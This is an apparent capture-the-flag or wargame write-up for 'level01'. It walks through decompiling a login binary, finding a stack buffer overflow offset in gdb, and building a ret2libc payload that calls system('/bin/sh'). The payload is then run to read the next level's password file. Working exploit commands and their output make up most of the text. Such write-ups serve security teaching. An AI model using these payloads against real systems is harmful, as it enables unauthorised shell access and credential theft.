We can see a ./level01 executable how show a prompt asking for a username and if it's ok then ask for a password.

We choose to decompile the program and in the source code we saw that the first input for the username is handle by a fgets call who expect to read at most 256 character on a buffer of 100.
Then this buffer will be compared to a string (dat_wil)

After this step if the username match the same process is executed.
An fgets call is performed expecting to read at most 100 character on a buffer of 64

Sadly after this even if we pass the correct harcoded password (admin) no other usefull code is reach.

So we are going for a rec2libc in order to get a system call with "/bin/sh" as argument

First of all we are going to pass a buffer overflow pattern to the first input request for the user name, in order to be able to go further in the execution we start our buffer overflow pattern with the expected user name. Then the program will continue and we will be able to know where to attack

+--------------------------------+--------------------------+
| expected user name (dat_will)  | buffer overflow pattern  |
+--------------------------------+--------------------------+

dat_willAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq

We run the program in gdb, pass our input, and get a segfault on adress 0x6c41396b. This mean the segfault occure at offset 328 in our pattern.

So now we are going to put our attack after the offset 328 in order to get a shell. Here the following payload schema.

+--------------------------------+-------------------------------+---------+
| expected user name (dat_will)  | buffer overflow pattern (328) | payload |
+--------------------------------+-------------------------------+---------+

First for the payload we need the adress of the function system and the adress of the string "/bin/sh".
We run the program in gdb and ask for the adress:

```gdb
p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

info proc map
process 2193
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
         0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
...

find 0xf7e2c000, +9999999, "/bin/sh"
0xf7f897ec
```

The `system` call need two parameters, the first one is the address of the function to call after return. We don't care about it so we are going to put some random value. And the second parameter is the address of the executable path.

Here the payload

```bash
python -c 'print "dat_wil" + "A" * 328 + "\xf7\xe6\xae\xd0"[::-1] + "\x00" * 4 + "\xf7\xf8\x97\xec"[::-1]'
```

Now we can execut this payload and pass it to the program as standar input and with the provided shell get the pass word

```bash
~$ (python -c 'print "dat_wil" + "A" * 328 + "\xf7\xe6\xae\xd0"[::-1] + "z" * 4 + "\xf7\xf8\x97\xec"[::-1]' ;cat)  | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
